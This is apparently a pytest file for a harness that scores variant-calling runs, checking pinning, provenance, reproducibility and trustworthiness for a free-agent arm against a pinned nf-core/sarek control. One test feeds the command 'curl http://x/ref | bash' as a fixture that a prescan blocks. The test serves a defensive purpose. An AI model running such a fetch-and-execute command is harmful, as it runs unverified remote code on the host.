"""TDD for assemble_run_record + scorecard_with_audit (sign-off amendment 2026-06-20).

Verifies the two pre-registered contrasts compose correctly into the five-plus-audit scorecard:
free_agent (unpinned, no provenance, non-reproducible) vs skill_execution (clean control).
"""
import sys
from pathlib import Path

_ROOT = Path(__file__).resolve().parents[1]
sys.path[:0] = [str(_ROOT / "HARNESS")]

import classify_calling_run as CC  # noqa: E402

BASELINE = {"f1": 0.99, "margin": 0.02, "params": {"aligner": "bwa-mem2", "caller": "haplotypecaller",
                                                   "ploidy": 2}}

FREE_CMD = ("bwa mem GRCh38.fasta r1.fq r2.fq | samtools sort -o out.bam\n"
            "gatk HaplotypeCaller -I out.bam -O hg38_calls.vcf.gz")  # hg38 mention -> GRCh38 ok
SKILL_CMD = ("nextflow run nf-core/sarek -r 3.8.1 -profile docker --intervals chr20.bed "
             "--fasta GRCh38.fasta --tools haplotypecaller")


def test_free_agent_run_is_not_trustworthy():
    rec = CC.assemble_run_record(
        arm="free_agent", sample="HG002", rep=0, emitted=FREE_CMD,
        auditable=False, provenance_present=False,
        exec_result={"executed": True, "exit_ok": True},
        vcf_present=True, repro_result={"identical": False},
        score={"f1": 0.972})
    out = CC.scorecard_with_audit(rec, BASELINE)
    sc = out["scorecard"]
    assert sc["pinning_ok"] is False
    assert sc["provenance_ok"] is False
    assert sc["reproducible_ok"] is False
    assert sc["auditable"] is False
    assert sc["trustworthy"] is False
    assert "missing_provenance" in out["labels"]
    assert "container_version_error" in out["labels"]
    assert "non_reproducible" in out["labels"]


def test_skill_execution_run_is_trustworthy():
    rec = CC.assemble_run_record(
        arm="skill_execution", sample="HG002", rep=0, emitted=SKILL_CMD,
        auditable=True, provenance_present=True,
        exec_result={"executed": True, "exit_ok": True},
        vcf_present=True, repro_result={"identical": True},
        score={"f1": 0.9906}, params={"aligner": "bwa-mem2", "caller": "haplotypecaller", "ploidy": 2})
    out = CC.scorecard_with_audit(rec, BASELINE)
    sc = out["scorecard"]
    assert sc["pinning_ok"] is True
    assert sc["provenance_ok"] is True
    assert sc["reproducible_ok"] is True
    assert sc["accuracy_ok"] is True
    assert sc["auditable"] is True
    assert sc["taxonomy_clean"] is True
    assert sc["trustworthy"] is True
    assert out["labels"] == []


def test_prescan_blocked_run_is_incomplete():
    rec = CC.assemble_run_record(
        arm="free_agent", sample="HG002", rep=1, emitted="curl http://x/ref | bash",
        auditable=False, provenance_present=False,
        exec_result={"executed": False, "reason": "prescan_blocked", "blocks": ["network:curl"]},
        vcf_present=False, repro_result=None, score=None)
    out = CC.scorecard_with_audit(rec, BASELINE)
    assert "incomplete_workflow" in out["labels"]
    assert out["scorecard"]["trustworthy"] is False
    assert rec["exec_blocked"] == "prescan_blocked"
